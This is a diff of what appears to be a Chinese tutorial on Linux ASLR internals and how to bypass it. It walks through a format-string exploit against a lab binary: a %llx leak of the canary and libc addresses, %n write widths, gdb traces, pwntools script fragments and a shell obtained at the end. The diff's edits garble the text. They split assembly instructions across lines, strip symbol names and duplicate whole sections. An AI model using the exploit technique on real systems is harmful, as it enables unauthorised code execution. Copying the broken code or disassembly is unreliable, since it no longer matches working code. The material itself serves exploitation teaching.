@@ -32,7 +32,7 @@ VFS为了支持各种文件系统，它定义一套所有文件系统都支持�
 struct file_system_type {
  const char *name;
  int fs_flags;
-#define FS_REQUIRES_DEV 1 
+#define FS_REQUIRES_DEV 1
 #define FS_BINARY_MOUNTDATA	2
 #define FS_HAS_SUBTYPE 4
 #define FS_USERNS_MOUNT 8	/* Can be mounted by userns root */
@@ -124,7 +124,7 @@ proc_ops结构体中有两个较为重要的成员，即proc_read和proc_write�
 
 static struct proc_dir_entry* lde_proc_entry = NULL;
 
-static ssize_t lde_proc_read(struct file* file, char __user* ubuf, size_t count, loff_t* data) 
+static ssize_t lde_proc_read(struct file* file, char __user* ubuf, size_t count, loff_t* data)
 {
  printk(KERN_INFO "%s called file 0x%px, buffer 0x%px count 0x%lx off 0x%llxn",
  __func__, file, ubuf, count, *data);
@@ -132,7 +132,7 @@ static ssize_t lde_proc_read(struct file* file, char __user* ubuf, size_t count,
  return 0;
 }
 
-static ssize_t lde_proc_write(struct file* file, const char __user* ubuf, size_t count, loff_t* data) 
+static ssize_t lde_proc_write(struct file* file, const char __user* ubuf, size_t count, loff_t* data)
 {
  printk(KERN_INFO "%s called legnth 0x%lx, 0x%pxn",
  __func__, count, ubuf);
@@ -474,7 +474,7 @@ rndbits = mmap64_rnd_bit = mmap_rnd_bits = CONFIG_ARCH_MMAP_RND_BITS = 32
 栈的解释：
 
 #define __STACK_RND_MASK(is32bit) ((is32bit) ? 0x7ff : 0x3fffff)
-#define STACK_RND_MASK __STACK_RND_MASK(mmap_is_ia32()) 
+#define STACK_RND_MASK __STACK_RND_MASK(mmap_is_ia32())
 
 random_variable = get_random_long();
 random_variable &= STACK_RND_MASK;
@@ -513,15 +513,16 @@ range >>= PAGE_SHIFT; // 0x2000 8kb
  117a: 48 89 e5 mov %rsp,%rbp
  117d: 48 83 ec 40 sub $0x40,%rsp
  设置栈空间
- 1181: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax
- 1188: 00 00 
+ 1181: 64 48 8b 04 25 28 00 mov %fs:
+0x28,%rax
+ 1188: 00 00
  118a: 48 89 45 f8 mov %rax,-0x8(%rbp)
  设置金丝雀
  118e: 31 c0 xor %eax,%eax
  清空eax
  1190: 48 8d 05 6d 0e 00 00 lea 0xe6d(%rip),%rax # 2004 <_IO_stdin_used+0x4>
  1197: 48 89 c7 mov %rax,%rdi
- 119a: e8 91 fe ff ff call 1030 <puts@plt>
+ 119a: e8 91 fe ff ff call 1030 
  读取待打印字符串并进行打印
  119f: 48 8d 45 c0 lea -0x40(%rbp),%rax
  11a3: 48 89 c6 mov %rax,%rsi
@@ -538,12 +539,13 @@ range >>= PAGE_SHIFT; // 0x2000 8kb
  设置缓冲区变量为1号形参
  11c1: b8 00 00 00 00 mov $0x0,%eax
  eax清零，用于处理返回值为非0的情况
- 11c6: e8 85 fe ff ff call 1050 <printf@plt>
+ 11c6: e8 85 fe ff ff call 1050 
  根据1号形参提供的格式化字符串进行打印
  11cb: 90 nop
  11cc: 48 8b 45 f8 mov -0x8(%rbp),%rax
- 11d0: 64 48 2b 04 25 28 00 sub %fs:0x28,%rax
- 11d7: 00 00 
+ 11d0: 64 48 2b 04 25 28 00 sub %fs:
+0x28,%rax
+ 11d7: 00 00
  11d9: 74 05 je 11e0 <leak_func+0x67>
  11db: e8 60 fe ff ff call 1040 <__stack_chk_fail@plt>
  检测金丝雀
@@ -555,15 +557,16 @@ range >>= PAGE_SHIFT; // 0x2000 8kb
  11e3: 48 89 e5 mov %rsp,%rbp
  11e6: 48 81 ec 10 01 00 00 sub $0x110,%rsp
  设置栈空间
- 11ed: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax
- 11f4: 00 00 
+ 11ed: 64 48 8b 04 25 28 00 mov %fs:
+0x28,%rax
+ 11f4: 00 00
  11f6: 48 89 45 f8 mov %rax,-0x8(%rbp)
  设置金丝雀
  11fa: 31 c0 xor %eax,%eax
  清空eax金丝雀
  11fc: 48 8d 05 09 0e 00 00 lea 0xe09(%rip),%rax # 200c <_IO_stdin_used+0xc>
  1203: 48 89 c7 mov %rax,%rdi
- 1206: e8 25 fe ff ff call 1030 <puts@plt>
+ 1206: e8 25 fe ff ff call 1030 
  准备待打印字符串，并调用puts函数
  120b: 48 8d 85 f0 fe ff ff lea -0x110(%rbp),%rax
  1212: ba 00 10 00 00 mov $0x1000,%edx
@@ -576,8 +579,9 @@ range >>= PAGE_SHIFT; // 0x2000 8kb
  调用read函数，1号形参为文件描述符，2号为缓冲区变量，3号为读取长度
  1224: 90 nop
  1225: 48 8b 45 f8 mov -0x8(%rbp),%rax
- 1229: 64 48 2b 04 25 28 00 sub %fs:0x28,%rax
- 1230: 00 00 
+ 1229: 64 48 2b 04 25 28 00 sub %fs:
+0x28,%rax
+ 1230: 00 00
  1232: 74 05 je 1239 <read_func+0x57>
  1234: e8 07 fe ff ff call 1040 <__stack_chk_fail@plt>
  金丝雀检测
@@ -593,7 +597,7 @@ range >>= PAGE_SHIFT; // 0x2000 8kb
  函数调用
  1249: 48 8d 05 c1 0d 00 00 lea 0xdc1(%rip),%rax # 2011 <_IO_stdin_used+0x11>
  1250: 48 89 c7 mov %rax,%rdi
- 1253: e8 d8 fd ff ff call 1030 <puts@plt>
+ 1253: e8 d8 fd ff ff call 1030 
  准备待打印字符串，并调用puts函数
  1258: b8 00 00 00 00 mov $0x0,%eax
  设置返回值
@@ -612,7 +616,7 @@ Stack: Canary found
 NX: NX enabled
 PIE: PIE enabled
 
-cat /proc/sys/kernel/randomize_va_space 
+cat /proc/sys/kernel/randomize_va_space
 2
 
 leak_func函数非常宽容的将格式化字符串的定义权交给输入端，对于输入端而言，者是不是利用机会呢？
@@ -698,7 +702,7 @@ printf("%.10u%nn", 1, &i);
 printf("i = %xn", i);
 
 输出结果：
-0000000001 
+0000000001
 i = a
 
 我们知道，一个内存地址的数字往往是非常大的，为了让数据被篡改为内存地址，就需要输出足够多的字符，好在转换指示符前允许添加数字x，指示输出x个字符，那么这样就不需要构造很多字符了。当然如果不希望单次写入大小过多，也可以对数据进行拆分，然后通过宽度的扩展指示符逐部分进行写入。
@@ -725,15 +729,16 @@ hhn：单字节、hn：双字节、n：4字节、ln：8字节、lln：16字节
 
 #0 main () at main.c:26
 #1 0x00007ffff7dd7c88 in __libc_start_call_main (
- main=main@entry=0x55555555523b <main>, argc=argc@entry=1, 
+ main=main@entry=0x55555555523b <main>, argc=argc@entry=1,
  argv=argv@entry=0x7fffffffdf68) at ../sysdeps/nptl/libc_start_call_main.h:58
-#2 0x00007ffff7dd7d4c in __libc_start_main_impl (main=0x55555555523b <main>, argc=1, 
- argv=0x7fffffffdf68, init=<optimized out>, fini=<optimized out>, 
- rtld_fini=<optimized out>, stack_end=0x7fffffffdf58) at ../csu/libc-start.c:360
+#2 0x00007ffff7dd7d4c in __libc_start_main_impl (main=0x55555555523b <main>, argc=1,
+ argv=0x7fffffffdf68, init=<optimized out>, fini=<optimized out>,
+ rtld_fini=<optimized out>, stack_end=0x7fffffffdf58) at ../csu/libc-start.c:
+360
 #3 0x00005555555550a5 in _start ()
 (gdb) frame 1
 #1 0x00007ffff7dd7c88 in __libc_start_call_main (
- main=main@entry=0x55555555523b <main>, argc=argc@entry=1, 
+ main=main@entry=0x55555555523b <main>, argc=argc@entry=1,
  argv=argv@entry=0x7fffffffdf68) at ../sysdeps/nptl/libc_start_call_main.h:5
 
 顺着前面金丝雀的读取，考虑到main函数中并没有分配栈空间，所以leak_func函数金丝雀上方就只有main函数栈底指针、main函数返回地址、__libc_start_call_main的栈底指针，__libc_start_call_main的返回地址四个参数，那么要获取LibC元素的地址就是第17个参数（13+3）。
@@ -873,38 +878,23 @@ https://bbs.kanxue.com/user-home-1000123.htm
 2：完全开启（BRK、堆、栈、MMAP、动态链接库）
 
 echo xxx | sudo tee -a /proc/sys/kernel/randomize_va_space
-```
-
-
-
-```
 第一次运行：
 7ffd1b667000-7ffd1b688000 rw-p 00000000 00:00 0 [stack]
 
 第二次运行：
 7ffd7024c000-7ffd7026d000 rw-p 00000000 00:00 0 [stack]
-```
-
-
-
-```
 一
 ASLR的实现
-```
-
-
-
-```
 struct file_system_type {
  const char *name;
  int fs_flags;
-#define FS_REQUIRES_DEV 1 
-#define FS_BINARY_MOUNTDATA	2
-#define FS_HAS_SUBTYPE 4
-#define FS_USERNS_MOUNT 8	/* Can be mounted by userns root */
-#define FS_DISALLOW_NOTIFY_PERM	16	/* Disable fanotify permission events */
-#define FS_ALLOW_IDMAP 32 /* FS has been updated to handle vfs idmappings. */
-#define FS_RENAME_DOES_D_MOVE	32768	/* FS will handle d_move() during rename() internally. */
+    #define FS_REQUIRES_DEV 1
+    #define FS_BINARY_MOUNTDATA	2
+    #define FS_HAS_SUBTYPE 4
+    #define FS_USERNS_MOUNT 8	/* Can be mounted by userns root */
+    #define FS_DISALLOW_NOTIFY_PERM	16	/* Disable fanotify permission events */
+    #define FS_ALLOW_IDMAP 32 /* FS has been updated to handle vfs idmappings. */
+    #define FS_RENAME_DOES_D_MOVE	32768	/* FS will handle d_move() during rename() internally. */
  int (*init_fs_context)(struct fs_context *);
  const struct fs_parameter_spec *parameters;
  struct dentry *(*mount) (struct file_system_type *, int,
@@ -924,17 +914,7 @@ struct file_system_type {
  struct lock_class_key invalidate_lock_key;
  struct lock_class_key i_mutex_dir_key;
 };
-```
-
-
-
-```
 extern int register_filesystem(struct file_system_type *);
-```
-
-
-
-```
 struct super_block {
  struct list_head	s_list; /* Keep this first */
  dev_t s_dev; /* search index; _not_ kdev_t */
@@ -957,11 +937,6 @@ struct super_block {
  spinlock_t s_inode_wblist_lock;
  struct list_head	s_inodes_wb;	/* writeback inodes */
 } __randomize_layout;
-```
-
-
-
-```
 static struct file_system_type proc_fs_type = {
  .name = "proc",
  .init_fs_context	= proc_init_fs_context,
@@ -975,26 +950,16 @@ void __init proc_root_init(void)
  ......
  register_filesystem(&proc_fs_type);
 }
-```
-
-
-
-```
 ls /proc/1/
 attr clear_refs cpuset fd limits mem net oom_score personality schedstat smaps_rollup status timerslack_ns
 autogroup cmdline cwd fdinfo loginuid mountinfo ns oom_score_adj projid_map sessionid stack syscall uid_map
 auxv comm environ gid_map map_files mounts numa_maps pagemap root setgroups stat task wchan
 cgroup coredump_filter exe io maps mountstats oom_adj patch_state sched smaps statm timers
-```
-
-
-
-```
-#include <linux/proc_fs.h>
+    #include <linux/proc_fs.h>
 
 static struct proc_dir_entry* lde_proc_entry = NULL;
 
-static ssize_t lde_proc_read(struct file* file, char __user* ubuf, size_t count, loff_t* data) 
+static ssize_t lde_proc_read(struct file* file, char __user* ubuf, size_t count, loff_t* data)
 {
  printk(KERN_INFO "%s called file 0x%px, buffer 0x%px count 0x%lx off 0x%llxn",
  __func__, file, ubuf, count, *data);
@@ -1002,7 +967,7 @@ static ssize_t lde_proc_read(struct file* file, char __user* ubuf, size_t count,
  return 0;
 }
 
-static ssize_t lde_proc_write(struct file* file, const char __user* ubuf, size_t count, loff_t* data) 
+static ssize_t lde_proc_write(struct file* file, const char __user* ubuf, size_t count, loff_t* data)
 {
  printk(KERN_INFO "%s called legnth 0x%lx, 0x%pxn",
  __func__, count, ubuf);
@@ -1043,11 +1008,6 @@ void lde_proc_remove(void)
 TAG_RETURN:
  return;
 }
-```
-
-
-
-```
 cat /proc/lde_proc
 echo test | sudo tee -a /proc/lde_proc
 
@@ -1055,14 +1015,9 @@ echo test | sudo tee -a /proc/lde_proc
 [ 446.024481] lde_proc_read called file 0xffff9626c2931400, buffer 0x000077aeb6db8000 count 0x40000 off 0x0
 [ 459.392387] lde_proc_write called legnth 0x5, 0x00007fff783f3090
 [ 476.345011] exiting from 0xffffffffc0af60f0 ...
-```
-
-
-
-```
 static struct ctl_table kern_table[] = {
 ......
-#if defined(CONFIG_MMU)
+    #if defined(CONFIG_MMU)
  {
  .procname	= "randomize_va_space",
  .data = &randomize_va_space,
@@ -1070,14 +1025,9 @@ static struct ctl_table kern_table[] = {
  .mode = 0644,
  .proc_handler	= proc_dointvec,
  },
-#endif
+    #endif
 ......
 }
-```
-
-
-
-```
 setup_new_exec(bprm);
 
 /* Do this so that we can load the interpreter, if need be. We will
@@ -1128,11 +1078,6 @@ if ((current->flags & PF_RANDOMIZE) && (randomize_va_space > 1)) {
  }
 
  mm->brk = mm->start_brk = arch_randomize_brk(mm);
-```
-
-
-
-```
 void setup_new_exec(struct linux_binprm * bprm)
 {
  ......
@@ -1156,11 +1101,6 @@ static unsigned long arch_rnd(unsigned int rndbits)
  return 0;
  return (get_random_long() & ((1UL << rndbits) - 1)) << PAGE_SHIFT;
 }
-```
-
-
-
-```
 unsigned long randomize_stack_top(unsigned long stack_top)
 {
  unsigned long random_variable = 0;
@@ -1170,11 +1110,11 @@ unsigned long randomize_stack_top(unsigned long stack_top)
  random_variable &= STACK_RND_MASK;
  random_variable <<= PAGE_SHIFT;
  }
-#ifdef CONFIG_STACK_GROWSUP
+    #ifdef CONFIG_STACK_GROWSUP
  return PAGE_ALIGN(stack_top) + random_variable;
-#else
+    #else
  return PAGE_ALIGN(stack_top) - random_variable;
-#endif
+    #endif
 }
 
 int setup_arg_pages(struct linux_binprm *bprm,
@@ -1182,7 +1122,7 @@ int setup_arg_pages(struct linux_binprm *bprm,
  int executable_stack)
 {
  ......
-#ifdef CONFIG_STACK_GROWSUP
+    #ifdef CONFIG_STACK_GROWSUP
  /* Limit stack size */
  stack_base = bprm->rlim_stack.rlim_max;
 
@@ -1200,7 +1140,7 @@ int setup_arg_pages(struct linux_binprm *bprm,
  stack_shift = vma->vm_start - stack_base;
  mm->arg_start = bprm->p - stack_shift;
  bprm->p = vma->vm_end - stack_shift;
-#else
+    #else
  stack_top = arch_align_stack(stack_top);
  stack_top = PAGE_ALIGN(stack_top);
 
@@ -1212,25 +1152,15 @@ int setup_arg_pages(struct linux_binprm *bprm,
 
  bprm->p -= stack_shift;
  mm->arg_start = bprm->p;
-#endif
+    #endif
  ......
 }
-```
-
-
-
-```
 unsigned long arch_align_stack(unsigned long sp)
 {
  if (!(current->personality & ADDR_NO_RANDOMIZE) && randomize_va_space)
  sp -= prandom_u32_max(8192);
  return sp & ~0xf;
 }
-```
-
-
-
-```
 unsigned long randomize_page(unsigned long start, unsigned long range)
 {
  if (!PAGE_ALIGNED(start)) {
@@ -1270,17 +1200,12 @@ load_elf_binary{
  }
 
  mm->brk = mm->start_brk = arch_randomize_brk(mm);
-#ifdef compat_brk_randomized
+    #ifdef compat_brk_randomized
  current->brk_randomized = 1;
-#endif
+    #endif
  }
  ......
 }
-```
-
-
-
-```
 static unsigned long arch_rnd(unsigned int rndbits)
 {
  if (!(current->flags & PF_RANDOMIZE))
@@ -1314,81 +1239,47 @@ load_elf_binary{
  }
  ......
 }
-```
-
-
-
-```
-#define PAGE_SHIFT 12
+    #define PAGE_SHIFT 12
 
 static inline unsigned long get_random_long(void)
 {
-#if BITS_PER_LONG == 64
+    #if BITS_PER_LONG == 64
  return get_random_u64();
-#else
+    #else
  return get_random_u32();
-#endif
+    #endif
 }
-```
-
-
-
-```
 rndbits = mmap64_rnd_bit = mmap_rnd_bits = CONFIG_ARCH_MMAP_RND_BITS = 32
 
 (get_random_long() & ((1UL << rndbits) - 1)) << PAGE_SHIFT
-```
-
-
-
-```
-#define __STACK_RND_MASK(is32bit) ((is32bit) ? 0x7ff : 0x3fffff)
-#define STACK_RND_MASK __STACK_RND_MASK(mmap_is_ia32()) 
+    #define __STACK_RND_MASK(is32bit) ((is32bit) ? 0x7ff : 0x3fffff)
+    #define STACK_RND_MASK __STACK_RND_MASK(mmap_is_ia32())
 
 random_variable = get_random_long();
 random_variable &= STACK_RND_MASK;
 random_variable <<= PAGE_SHIFT;
-```
-
-
-
-```
 range = 0x02000000 // 32mb
 range >>= PAGE_SHIFT; // 0x2000 8kb
 (get_random_long() % range << PAGE_SHIFT)
-```
-
-
-
-```
 二
 绕过思路
-```
-
-
-
-```
 三
 示例讲解
-```
-
-
-
-```
 0000000000001179 <leak_func>:
  1179: 55 push %rbp
  117a: 48 89 e5 mov %rsp,%rbp
  117d: 48 83 ec 40 sub $0x40,%rsp
  设置栈空间
- 1181: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax
- 1188: 00 00 
+ 1181: 64 48 8b 04 25 28 00 mov %fs:
+0x28,%rax
+ 1188: 00 00
  118a: 48 89 45 f8 mov %rax,-0x8(%rbp)
  设置金丝雀
  118e: 31 c0 xor %eax,%eax
  清空eax
  1190: 48 8d 05 6d 0e 00 00 lea 0xe6d(%rip),%rax # 2004 <_IO_stdin_used+0x4>
  1197: 48 89 c7 mov %rax,%rdi
- 119a: e8 91 fe ff ff call 1030 <puts@plt>
+ 119a: e8 91 fe ff ff call 1030 
  读取待打印字符串并进行打印
  119f: 48 8d 45 c0 lea -0x40(%rbp),%rax
  11a3: 48 89 c6 mov %rax,%rsi
@@ -1405,12 +1296,13 @@ range >>= PAGE_SHIFT; // 0x2000 8kb
  设置缓冲区变量为1号形参
  11c1: b8 00 00 00 00 mov $0x0,%eax
  eax清零，用于处理返回值为非0的情况
- 11c6: e8 85 fe ff ff call 1050 <printf@plt>
+ 11c6: e8 85 fe ff ff call 1050 
  根据1号形参提供的格式化字符串进行打印
  11cb: 90 nop
  11cc: 48 8b 45 f8 mov -0x8(%rbp),%rax
- 11d0: 64 48 2b 04 25 28 00 sub %fs:0x28,%rax
- 11d7: 00 00 
+ 11d0: 64 48 2b 04 25 28 00 sub %fs:
+0x28,%rax
+ 11d7: 00 00
  11d9: 74 05 je 11e0 <leak_func+0x67>
  11db: e8 60 fe ff ff call 1040 <__stack_chk_fail@plt>
  检测金丝雀
@@ -1422,15 +1314,16 @@ range >>= PAGE_SHIFT; // 0x2000 8kb
  11e3: 48 89 e5 mov %rsp,%rbp
  11e6: 48 81 ec 10 01 00 00 sub $0x110,%rsp
  设置栈空间
- 11ed: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax
- 11f4: 00 00 
+ 11ed: 64 48 8b 04 25 28 00 mov %fs:
+0x28,%rax
+ 11f4: 00 00
  11f6: 48 89 45 f8 mov %rax,-0x8(%rbp)
  设置金丝雀
  11fa: 31 c0 xor %eax,%eax
  清空eax金丝雀
  11fc: 48 8d 05 09 0e 00 00 lea 0xe09(%rip),%rax # 200c <_IO_stdin_used+0xc>
  1203: 48 89 c7 mov %rax,%rdi
- 1206: e8 25 fe ff ff call 1030 <puts@plt>
+ 1206: e8 25 fe ff ff call 1030 
  准备待打印字符串，并调用puts函数
  120b: 48 8d 85 f0 fe ff ff lea -0x110(%rbp),%rax
  1212: ba 00 10 00 00 mov $0x1000,%edx
@@ -1443,8 +1336,9 @@ range >>= PAGE_SHIFT; // 0x2000 8kb
  调用read函数，1号形参为文件描述符，2号为缓冲区变量，3号为读取长度
  1224: 90 nop
  1225: 48 8b 45 f8 mov -0x8(%rbp),%rax
- 1229: 64 48 2b 04 25 28 00 sub %fs:0x28,%rax
- 1230: 00 00 
+ 1229: 64 48 2b 04 25 28 00 sub %fs:
+0x28,%rax
+ 1230: 00 00
  1232: 74 05 je 1239 <read_func+0x57>
  1234: e8 07 fe ff ff call 1040 <__stack_chk_fail@plt>
  金丝雀检测
@@ -1460,7 +1354,7 @@ range >>= PAGE_SHIFT; // 0x2000 8kb
  函数调用
  1249: 48 8d 05 c1 0d 00 00 lea 0xdc1(%rip),%rax # 2011 <_IO_stdin_used+0x11>
  1250: 48 89 c7 mov %rax,%rdi
- 1253: e8 d8 fd ff ff call 1030 <puts@plt>
+ 1253: e8 d8 fd ff ff call 1030 
  准备待打印字符串，并调用puts函数
  1258: b8 00 00 00 00 mov $0x0,%eax
  设置返回值
@@ -1468,54 +1362,24 @@ range >>= PAGE_SHIFT; // 0x2000 8kb
  恢复栈底指针
  125e: c3 ret
  返回
-```
-
-
-
-```
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: PIE enabled
 
-cat /proc/sys/kernel/randomize_va_space 
+cat /proc/sys/kernel/randomize_va_space
 2
-```
-
-
-
-```
 int printf(const char* format, ...)
-```
-
-
-
-```
 ls /dev/ | grep std
 stderr
 stdin
 stdout
-```
-
-
-
-```
 ls /proc/self/fd/
 0 1 19 2 20 23 27 3
-```
-
-
-
-```
 获取参数的方式：
 前6个参数：rdi、rsi、rdx、rcx、r8、r9
 第7个及以后的参数：栈
-```
-
-
-
-```
 构造的参数："%llx.%llx.......%llx.%llx
 读取及输出：scanf("%s", buf);、printf(buf);
 
@@ -1543,45 +1407,26 @@ a.0.0.ffffffff.ffffffffffffff88
 
 第6-13个泄露信息：
 6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.
-```
-
-
-
-```
 printf("%.10u%nn", 1, &i);
 printf("i = %xn", i);
 
 输出结果：
-0000000001 
+0000000001
 i = a
-```
-
-
-
-```
 hhn：单字节、hn：双字节、n：4字节、ln：8字节、lln：16字节
-```
-
-
-
-```
 #0 main () at main.c:26
 #1 0x00007ffff7dd7c88 in __libc_start_call_main (
- main=main@entry=0x55555555523b <main>, argc=argc@entry=1, 
+ main=main@entry=0x55555555523b <main>, argc=argc@entry=1,
  argv=argv@entry=0x7fffffffdf68) at ../sysdeps/nptl/libc_start_call_main.h:58
-#2 0x00007ffff7dd7d4c in __libc_start_main_impl (main=0x55555555523b <main>, argc=1, 
- argv=0x7fffffffdf68, init=<optimized out>, fini=<optimized out>, 
- rtld_fini=<optimized out>, stack_end=0x7fffffffdf58) at ../csu/libc-start.c:360
+#2 0x00007ffff7dd7d4c in __libc_start_main_impl (main=0x55555555523b <main>, argc=1,
+ argv=0x7fffffffdf68, init=<optimized out>, fini=<optimized out>,
+ rtld_fini=<optimized out>, stack_end=0x7fffffffdf58) at ../csu/libc-start.c:
+360
 #3 0x00005555555550a5 in _start ()
 (gdb) frame 1
 #1 0x00007ffff7dd7c88 in __libc_start_call_main (
- main=main@entry=0x55555555523b <main>, argc=argc@entry=1, 
+ main=main@entry=0x55555555523b <main>, argc=argc@entry=1,
  argv=argv@entry=0x7fffffffdf68) at ../sysdeps/nptl/libc_start_call_main.h:5
-```
-
-
-
-```
 0000000000025cc0 <__libc_start_main@@GLIBC_2.34>:
  ......
  25d47:	e8 c4 fe ff ff call 25c10 <__libc_init_first@@GLIBC_2.2.5+0x10>
@@ -1591,11 +1436,6 @@ hhn：单字节、hn：双字节、n：4字节、ln：8字节、lln：16字节
  25c86:	ff d0 call *%rax
  25c88:	89 c7 mov %eax,%edi
  ......
-```
-
-
-
-```
 import pwn
 
 def convert2hex(data):
@@ -1673,11 +1513,6 @@ def main():
 if __name__ == '__main__':
  main()
  sys.exit(0)
-```
-
-
-
-```
 [*] Switching to interactive mode
 $ whoami
 test
